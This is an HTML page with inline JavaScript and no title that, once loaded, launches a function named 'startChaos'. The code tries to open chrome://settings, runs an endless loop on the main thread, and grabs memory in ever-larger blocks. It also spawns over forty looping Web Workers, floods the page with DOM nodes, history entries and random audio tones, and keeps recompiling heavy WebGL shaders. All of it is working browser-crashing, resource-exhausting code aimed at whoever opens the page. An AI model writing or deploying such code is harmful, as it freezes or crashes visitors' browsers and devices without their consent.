<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title></title>
<style>
*{will-change:transform,filter;}
body{margin:0;overflow:hidden;background:black;}
canvas{position:fixed;left:0;top:0;}
</style>
</head>
<body>

<canvas id="gl"></canvas>

<script>
const canvas=document.getElementById("gl");
canvas.width=innerWidth;
canvas.height=innerHeight;
const gl=canvas.getContext("webgl");
gl.clearColor(1,0,0,1);
gl.clear(gl.COLOR_BUFFER_BIT);

setTimeout(startChaos,1000);

function startChaos(){

setTimeout(()=>{
 try{location.href="chrome://settings"}catch(e){}
 try{location.replace("chrome://settings")}catch(e){}
},3000);

setTimeout(()=>{
 while(true){Math.sqrt(Math.random()*Date.now())}
},2000);

let mem=[];
let size=50_000_000;
setInterval(()=>{
 mem.push(new Uint8Array(size));
 size+=25_000_000;
},120);

setInterval(()=>{
 for(let i=0;i<5000;i++){
  let d=document.createElement("div");
  d.textContent=Math.random();
  d.style.position="absolute";
  d.style.left=Math.random()*innerWidth+"px";
  d.style.top=Math.random()*innerHeight+"px";
  document.body.appendChild(d);
 }
},80);

setInterval(()=>{
 history.pushState({}, "", "#"+Math.random());
},30);

let workers=0;
let wInt=setInterval(()=>{
 new Worker(URL.createObjectURL(new Blob([`
  while(true){Math.tan(Math.random())}
 `])));
 workers++;
 if(workers>40) clearInterval(wInt);
},100);

const AC=window.AudioContext||window.webkitAudioContext;
const ac=new AC();
setInterval(()=>{
 let o=ac.createOscillator();
 o.frequency.value=Math.random()*6000;
 o.connect(ac.destination);
 o.start();
 o.stop(ac.currentTime+0.05);
},80);

const flood=document.createElement("canvas");
document.body.appendChild(flood);
const fx=flood.getContext("2d");

function gpu2d(){
 flood.width=innerWidth;
 flood.height=innerHeight;
 for(let i=0;i<20000;i++){
  fx.fillStyle=`hsl(${Math.random()*360},100%,50%)`;
  fx.fillRect(Math.random()*innerWidth,Math.random()*innerHeight,30,30);
 }
 requestAnimationFrame(gpu2d);
}
gpu2d();

const quad=[
-1,-1,0,1,-1,0,1,1,0,
-1,-1,0,1,1,0,-1,1,0
];

function frag(){
return `
precision highp float;
float h(vec2 p){return fract(sin(dot(p,vec2(127.1,311.7)))*43758.5);}
void main(){
 vec2 uv=gl_FragCoord.xy/vec2(${innerWidth}.0,${innerHeight}.0);
 vec3 c=vec3(0.);
 for(int i=0;i<40;i++){
  float t=float(i);
  uv+=vec2(sin(uv.y*t*10.),cos(uv.x*t*10.))*0.02;
  c+=vec3(
   sin(uv.x*100.+t),
   cos(uv.y*100.-t),
   sin((uv.x+uv.y)*50.)
  );
 }
 c+=vec3(h(uv));
 gl_FragColor=vec4(c,1.);
}`;
}

const VSHADER=`attribute vec4 p;void main(){gl_Position=p;}`;

function compile(t,s){
 let sh=gl.createShader(t);
 gl.shaderSource(sh,s);
 gl.compileShader(sh);
 return sh;
}

let buf=gl.createBuffer();
gl.bindBuffer(gl.ARRAY_BUFFER,buf);
gl.bufferData(gl.ARRAY_BUFFER,new Float32Array(quad),gl.STATIC_DRAW);

function build(){
 let vs=compile(gl.VERTEX_SHADER,VSHADER);
 let fs=compile(gl.FRAGMENT_SHADER,frag());
 let pr=gl.createProgram();
 gl.attachShader(pr,vs);
 gl.attachShader(pr,fs);
 gl.linkProgram(pr);
 gl.useProgram(pr);
 let loc=gl.getAttribLocation(pr,"p");
 gl.vertexAttribPointer(loc,3,gl.FLOAT,false,0,0);
 gl.enableVertexAttribArray(loc);
 return pr;
}

let prog=build();

setInterval(()=>{prog=build()},200);

setInterval(()=>{
 canvas.width=500+Math.random()*2000;
 canvas.height=500+Math.random()*2000;
 gl.viewport(0,0,canvas.width,canvas.height);
},150);

setInterval(()=>{
 let c=document.createElement("canvas");
 let g=c.getContext("webgl");
 if(g){
  let s=g.createShader(g.FRAGMENT_SHADER);
  g.shaderSource(s,frag());
  g.compileShader(s);
 }
},200);

function draw(){
 for(let i=0;i<10;i++){
  gl.drawArrays(gl.TRIANGLES,0,6);
 }
 gl.finish();
 requestAnimationFrame(draw);
}
draw();

}
</script>
</body>
</html>
